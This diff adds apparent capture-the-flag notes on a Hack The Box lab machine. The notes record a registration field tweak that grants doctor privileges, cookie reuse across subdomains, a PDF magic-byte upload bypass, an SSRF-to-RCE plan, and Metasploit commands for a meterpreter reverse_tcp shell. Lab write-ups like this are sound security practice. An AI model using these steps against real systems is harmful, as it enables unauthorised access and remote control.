@@ -1,0 +1,63 @@
+meddigi.htb --> there are two ports open for web, the site is HTTPS
+
+login cannot be injected most likely.
+
+Website Req Details {
+	Cookie: .AspNetCore.Antiforgery.ML5pX7jOz00=CfDJ8ComA6OWBg1LozGKheQE8oWFL1FEOFOWQIF6PvRjah5i-ao_Y-G8wdP__XNvxU2VGMmtUXK1LT2DXxoxi9O2Fpx8RhKOrNsdhWZ9GBDUQgf4WCp2nbotRcweVvaI-oTEYdpNEk_ldTT7av1UyqOGlFo
+	
+	Server: Microsoft-IIS/10.0
+	
+	Email=ender%40meddigi.htb&Password=enderpass1&__RequestVerificationToken=CfDJ8ComA6OWBg1LozGKheQE8oVBEKTKioJICplq8K32wOkqgPf0-jepaBFPx9A1vqhJmDWtgJxzYS1NXStPLmtErHKZPcqjxmTIPOK2AQ5l8cniyfAhux-mmmcJ0BhlETmO8CRDiHVMsK1E-mF9aVtnh0c
+}
+
+emails {
+	support@meddigi.htb 
+}
+
+Request A Call-Back section of the website seem to do something, unsure if its void
+
+Inside the request to register, buried inside is an ID parameter, setting this to 2 grants us doctor privs
+{
+"Name":"ender",
+"LastName":"ender",
+"Email":"support%40meddigi.htb",
+"Password":"enderpassword1",
+"ConfirmPassword":"enderpassword1",
+"DateOfBirth":"2023-10-02",
+"PhoneNumber":"1111111111",
+"Country":"NA",
+"Acctype":"1", ==> Switch to 2
+"__RequestVerificationToken":"CfDJ8BOyb6sL3txJo0VGaU-PdBVicz_eVcBdiqNUkHv-ulF_KiLqUbytgfEt34AyO8QErLvDMWCM-CHVFo1ihXM65toSd6hyALDClqYZTyLIr2EzxAfy22owtlDoEB3PBYJ6rlUIuOCv7tM-mTcta-Q4wBk"
+}
+
+Subdomain search gave us a subdom named portal, portal.meddigi.htb ==> login portal
+
+To get inside the other domain, we need to make a get request to /home,
+then inside that intercepted request we need to add our doctor cookie
+from the other domain, the box likes to recycle cookies.
+
+** WE ONLY NEED THE ACCESS_TOKEN ** ^^^^
+
+There is a cleaning script that wipes databases, this might get us booted off
+while we look around or try exploiting.
+
+/ExamReport only accepts PDF files
+Magic Bytes :: 25 50 44 46 2D ==> PDF
+
+file:///C:/fakepath/test.txt ==> url must have http:// or https://
+
+Signed up succesfully. Sign in to continue. ==> Email isnt being used [redirection]
+Email already in use. ==> [No Redirection]
+
+http://127.0.0.1:8080/ ==> This is a weird port to have open because 443 deals with https
+
+Using the SSRF we found with the perscription link, we can access a table
+containing the URLS of files we upload.
+We will have to chain a mix of file reads and LFI to possibly gain RCE if possible.
+
+** PAYLOADS BETWEEN ASPX FILE AND HANDLER MUST MATCH **
+==== Meterpreter Shell ====
+`use exploit/multi/handler`: handles the incoming connection
+`set payload windows/64/meterpreter/reverse_tcp`: reverses the TCP payload
+`set LHOST tun0`: HTB VPN Interface
+`show options`: shows the available options to set
